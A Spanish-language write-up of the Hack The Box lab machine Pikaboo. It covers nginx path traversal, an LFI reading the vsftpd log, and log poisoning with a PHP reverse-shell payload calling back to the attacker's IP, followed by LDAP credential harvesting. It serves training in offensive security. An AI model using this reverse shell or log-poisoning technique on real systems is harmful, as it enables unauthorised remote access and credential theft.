---
layout: single
title: Pikaboo - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Pikaboo de la plataforma de Hackthebox, Pikaboo es una máquina Linux de nivel difícil en la que solo se exponen servicios de FTP, SSH y web. El sitio web, alojado en Apache, presenta una página de colección de pokémon. Debido a configuraciones incorrectas en el servidor proxy NGINX podemos aplicar un path traversal attack, explotando esto, es posible acceder al panel de administración donde haremos un Log Poisoning con FTP para ganar acceso para la escalada nos aprovecharemos de una tarea cron obtendremos credenciales LDAP válidas, para enumerar el servicio LDAP local,y poder acceder por ftp gracias a credenciales que encontraremos, donde es posible crear y cargar archivos maliciosos que pueden aprovechar una vulnerabilidad en una función Perl en el script para ejecutar código y obtener una shell como root"
date: 2023-12-22
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-pikaboo/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Log Poisoning
  - Cron Job
  - Ldap
---

![](https://i.imgur.com/OJvQpkK.png)

## PortScan

```bash
❯ nmap -sCV -p21,22,80 10.10.10.249 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 17:01 CST
Nmap scan report for 10.10.10.249
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Bueno vemos 3 puertos abiertos entre ellos el puerto **21** que corresponde al servicio **FTP** **nmap** no nos reporta que tiene habilitado el **FTP anonymous login** a si que vamos a probarlo manualmente

```bash
❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:miguelrega7): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

Pero bueno no funciona a si que vamos a comenzar enumerando el puerto **80**, de primeras vemos que no se esta aplicando **Virtual Hosting**

```bash
❯ curl -s -I http://10.10.10.249
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 22 Dec 2023 23:06:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
```

Si usamos **whatweb** para ver las tecnologias que se estan utlizando encontramos las siguientes

```ruby
❯ whatweb http://10.10.10.249
http://10.10.10.249 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.249], Script, Title[Pikaboo], nginx[1.14.2]
```

Vamos a ver la web

![](https://i.imgur.com/vr0TVBe.png)

Si vamos a **admin** vemos un panel de login de momento no haremos fuerza bruta

![](https://i.imgur.com/chSaxul.png)

Vemos varios tipos de aliens o quien sabe que sean raras

![](https://i.imgur.com/an0aSbe.png)

De primeras si hacemos click al nombre nos lleva a una **url** intersante pero si intentamos cargar un archivo no obtendremos resultado

![](https://i.imgur.com/rSQPnZn.png)

Antes de seguir inspeccionando vamos aplicar **Fuzzing** para ver si encontramos alguna ruta interesante pero nada

```bash
❯ gobuster dir -u http://10.10.10.249 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.249
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://10.10.10.249/images/]
/admin                (Status: 401) [Size: 456]
/administration       (Status: 401) [Size: 456]
/administrator        (Status: 401) [Size: 456]
```

## Log Poisoning

Y bueno algo que podemos hacer es buscar si hay vulnerabilidades en la version de **nginx** 

Si buscamos como ponemos enumerarlo en **hacktriks** encontramos informacion https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx basicamente nos dicen hay una vulnerabilidad **LFI** 

![](https://i.imgur.com/o3Dt0pg.png)

Si hacemos lo que dice obtenemos este resultado

![](https://i.imgur.com/9rWSkmT.png)

Podemos hacer **Fuzzing** para ver si encontramos alguna ruta interesante

```bash
❯ gobuster dir -u http://10.10.10.249/admin../ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.249/admin../
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 456]
/javascript           (Status: 301) [Size: 314] [--> http://127.0.0.1:81/javascript/]
/server-status        (Status: 200) [Size: 5360]
```

Podemos ver que la ruta **server-status** funciona y vemos informacion

![](https://i.imgur.com/2JHCt6e.png)

Si probamos las rutas que nos muestran por ejemplo la primera **admin_staging** nos aplica un redirect 

![](https://i.imgur.com/U0PU1Ks.png)

Pero como tal la ruta existe a si que haremos **Fuzzing** bajo esa ruta

Vemos 2 rutas pero con codigo de estado **301** 

```bash
❯ gobuster dir -u http://10.10.10.249/admin../admin_staging -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.249/admin../admin_staging
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 301) [Size: 322] [--> http://127.0.0.1:81/admin_staging/docs/]
/assets               (Status: 301) [Size: 324] [--> http://127.0.0.1:81/admin_staging/assets/]
```

Como tal la pagina interpreta **PHP** a si que podemos **Fuzzear** por archivos que tengan como extension **.php** con **Wfuzz

```bash
❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.249/admin../admin_staging/FUZZ.php --hc=404,401,403 -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.249/admin../admin_staging/FUZZ.php
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000111:   200        210 L    498 W      9627 Ch     "user"                                                         
000000071:   200        803 L    4235 W     71644 Ch    "info"                                                         
000000001:   200        882 L    2267 W     40554 Ch    "index"                                                        
000002913:   200        515 L    1218 W     25205 Ch    "dashboard"                                                    
000003705:   200        376 L    589 W      13778 Ch    "tables"   
```

Si probamos con la ruta **index.php** llegamos a un tipo **Dashboard** 

![](https://i.imgur.com/m58mPzd.png)

Vemos que en **User** hay un parametro que apunta a **user.php** podemos tratar de cargar algun archivo de la maquina

![](https://i.imgur.com/XqHBhBY.png)

Si probamos llendo directorios para atras no podremos ver nada tampoco

![](https://i.imgur.com/AXn1Osk.png)

## Shell as www-data && Log Poisoning

Podemos probar con otra ruta si repasamos el puerto **21** esta abierto a si que podemos ver si tenemos suerte con **/var/log/vsftpd.log** 

Y bueno zi 

![](https://i.imgur.com/OwEm7G8.png)

Pues bueno ya vemos por donde va la cosa podemos ver los **logs** y la web interpreta **php** podemos inyectar codigo y ganar acceso facilmente mediante una reverse shell

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Vamos a inyectar una reverse shell en **php** para que cuando la interprete el servidor ganemos acceso ala maquina

```bash
❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:miguelrega7): <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.116/443 0>&1'")?>
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

Ahora si recargamos la pagina obtendremos acceso o con hacer una peticion 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.116] from (UNKNOWN) [10.10.10.249] 44174
bash: cannot set terminal process group (674): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pikaboo:/var/www/html/admin_staging$ 
```

Ahora hacemos lo siguiente para poder hacer **ctrl+c** 

```bash
www-data@pikaboo:/var/www/html/admin_staging$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@pikaboo:/var/www/html/admin_staging$ ^Z
zsh: suspended  nc -nlvp 443
                                                                                                                                
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@pikaboo:/var/www/html/admin_staging$ export TERM=xterm
```

## User.txt

Aqui podemos ver la ruta de la **flag**

```bash
www-data@pikaboo:/$ find / -type f -name "user.txt" 2>/dev/null | grep -v find
/home/pwnmeow/user.txt
www-data@pikaboo:/$ 
```

```bash
www-data@pikaboo:/$ cat /home/pwnmeow/user.txt
466f85fd1ddfbd7a9790390e857c012e
www-data@pikaboo:/$
```

## Escalada de privilegios

Vemos un usuario que se llama **pwnmeow** 

```bash
www-data@pikaboo:/home$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
postgres:x:110:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
www-data@pikaboo:/home$ 
```

Aqui podemos ver una tarea cron que se ejecuta cada minuto

```bash
www-data@pikaboo:/home/pwnmeow$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
www-data@pikaboo:/home/pwnmeow$ 
```

Este es el contenido

```bash
www-data@pikaboo:/home/pwnmeow$ cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
www-data@pikaboo:/home/pwnmeow$ 
```

Este script tiene como objetivo procesar archivos CSV en un directorio específico y luego eliminar todos los archivos en ese directorio

![](https://i.imgur.com/KGPXVE5.png)

Pero bueno hay que seguir enumerando la maquina

Hay un archivo en la maquina donde podemos ver credenciales por el protocolo **Ldap** 

```bash
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
```

En el archivo **settings.py** 

```bash
www-data@pikaboo:/opt/pokeapi/config$ pwd
/opt/pokeapi/config
www-data@pikaboo:/opt/pokeapi/config$ ls
__init__.py  docker-compose.py	local.py     urls.py
__pycache__  docker.py		settings.py  wsgi.py
www-data@pikaboo:/opt/pokeapi/config$ 
```

**Ldap** casi siempre corre por lo general en el puerto **389** que esta abierto internamente en la maquina

```bash
www-data@pikaboo:/opt/pokeapi/config$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        1      0 127.0.0.1:81            127.0.0.1:59700         CLOSE_WAIT 
tcp        0    138 10.10.10.249:44174      10.10.14.116:443        ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::21                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 10.10.10.249:21         10.10.14.116:52310      ESTABLISHED
www-data@pikaboo:/opt/pokeapi/config$ 
```

Vemos que **ldapsearch** se encuentra en la maquina instalado a si que podemos usarlo para enumerar

```bash
www-data@pikaboo:/opt/pokeapi/config$ which ldapsearch
/usr/bin/ldapsearch
www-data@pikaboo:/opt/pokeapi/config$ 
```

Y encontramos informacion en **base64** 

```bash
www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -x -h 127.0.0.1 -w 'J~42%W?PFHl]g' -b "dc=pikaboo,dc=htb" -D "cn=binduser,ou=usrs,dc=pikaboo,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
www-data@pikaboo:/opt/pokeapi/config$
```

Y tenemos una contraseña

```bash
www-data@pikaboo:/opt/pokeapi/config$ echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d; echo
_G0tT4_C4tcH_'3m_4lL!_
www-data@pikaboo:/opt/pokeapi/config$ 
```

Vamos a probar si son las del protocolo **FTP** con el usuario que tenemos

```bash
❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:miguelrega7): pwnmeow
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Vamos a ver si podemos subir algun archivo a este directorio

```bash
ftp> dir
229 Entering Extended Passive Mode (|||52257|)
150 Here comes the directory listing.
drwx-wx---    2 ftp      ftp          4096 May 20  2021 abilities
drwx-wx---    2 ftp      ftp          4096 May 20  2021 ability_changelog
drwx-wx---    2 ftp      ftp          4096 May 20  2021 ability_changelog_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 ability_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20  2021 ability_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 ability_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 berries
drwx-wx---    2 ftp      ftp          4096 May 20  2021 berry_firmness
drwx-wx---    2 ftp      ftp          4096 May 20  2021 berry_firmness_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 berry_flavors
drwx-wx---    2 ftp      ftp          4096 May 20  2021 characteristic_text
drwx-wx---    2 ftp      ftp          4096 May 20  2021 characteristics
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_episode_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_episode_warriors
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_episodes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_kingdom_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_kingdoms
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_max_links
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_data
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_displacement_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_displacements
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_range_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_move_ranges
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_pokemon_abilities
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_pokemon_evolution
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_pokemon_moves
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_pokemon_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_stat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_transformation_pokemon
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_transformation_warriors
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_archetypes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_rank_stat_map
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_ranks
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_skill_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_skills
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_specialties
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_stat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warrior_transformation
drwx-wx---    2 ftp      ftp          4096 May 20  2021 conquest_warriors
drwx-wx---    2 ftp      ftp          4096 May 20  2021 contest_combos
drwx-wx---    2 ftp      ftp          4096 May 20  2021 contest_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 contest_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 contest_type_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 contest_types
drwx-wx---    2 ftp      ftp          4096 May 20  2021 egg_group_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 egg_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_condition_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_condition_value_map
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_condition_value_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_condition_values
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_conditions
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_method_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_methods
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounter_slots
drwx-wx---    2 ftp      ftp          4096 May 20  2021 encounters
drwx-wx---    2 ftp      ftp          4096 May 20  2021 evolution_chains
drwx-wx---    2 ftp      ftp          4096 May 20  2021 evolution_trigger_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 evolution_triggers
drwx-wx---    2 ftp      ftp          4096 May 20  2021 experience
drwx-wx---    2 ftp      ftp          4096 May 20  2021 genders
drwx-wx---    2 ftp      ftp          4096 May 20  2021 generation_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 generations
drwx-wx---    2 ftp      ftp          4096 May 20  2021 growth_rate_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 growth_rates
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_categories
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_category_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_flag_map
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_flag_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_flags
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_flavor_summaries
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_fling_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_fling_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_game_indices
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_pocket_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_pockets
drwx-wx---    2 ftp      ftp          4096 May 20  2021 item_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 items
drwx-wx---    2 ftp      ftp          4096 May 20  2021 language_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 languages
drwx-wx---    2 ftp      ftp          4096 May 20  2021 location_area_encounter_rates
drwx-wx---    2 ftp      ftp          4096 May 20  2021 location_area_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 location_areas
drwx-wx---    2 ftp      ftp          4096 May 20  2021 location_game_indices
drwx-wx---    2 ftp      ftp          4096 May 20  2021 location_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 locations
drwx-wx---    2 ftp      ftp          4096 May 20  2021 machines
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_battle_style_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_battle_styles
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_changelog
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_damage_class_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_damage_classes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_effect_changelog
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_effect_changelog_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_flag_map
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_flag_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_flags
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_flavor_summaries
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta_ailment_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta_ailments
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta_categories
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta_category_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_meta_stat_changes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_target_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 move_targets
drwx-wx---    2 ftp      ftp          4096 May 20  2021 moves
drwx-wx---    2 ftp      ftp          4096 May 20  2021 nature_battle_style_preferences
drwx-wx---    2 ftp      ftp          4096 May 20  2021 nature_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 nature_pokeathlon_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 natures
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pal_park
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pal_park_area_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pal_park_areas
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokeathlon_stat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokeathlon_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokedex_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokedex_version_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokedexes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_abilities
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_color_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_colors
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_dex_numbers
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_egg_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_evolution
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_form_generations
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_form_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_form_pokeathlon_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_form_types
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_forms
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_game_indices
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_habitat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_habitats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_items
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_move_method_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_move_methods
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_moves
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_shape_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_shapes
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_species
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_species_flavor_summaries
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_species_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_species_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_species_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_types
drwx-wx---    2 ftp      ftp          4096 May 20  2021 pokemon_types_past
drwx-wx---    2 ftp      ftp          4096 May 20  2021 region_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 regions
drwx-wx---    2 ftp      ftp          4096 May 20  2021 stat_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 stats
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_combos
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_effect_prose
drwx-wx---    2 ftp      ftp          4096 May 20  2021 super_contest_effects
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_efficacy
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_game_indices
drwx-wx---    2 ftp      ftp          4096 May 20  2021 type_names
drwx-wx---    2 ftp      ftp          4096 May 20  2021 types
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_group_pokemon_move_methods
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_group_regions
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_groups
drwx-wx---    2 ftp      ftp          4096 May 20  2021 version_names
drwx-wx---    2 ftp      ftp          4096 Jul 06  2021 versions
226 Directory send OK.
ftp> cd versions
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||15096|)
150 Here comes the directory listing.
226 Transfer done (but failed to open directory).
ftp> 
```

## Shell as root root.txt

![](https://i.imgur.com/am5jDOy.png)

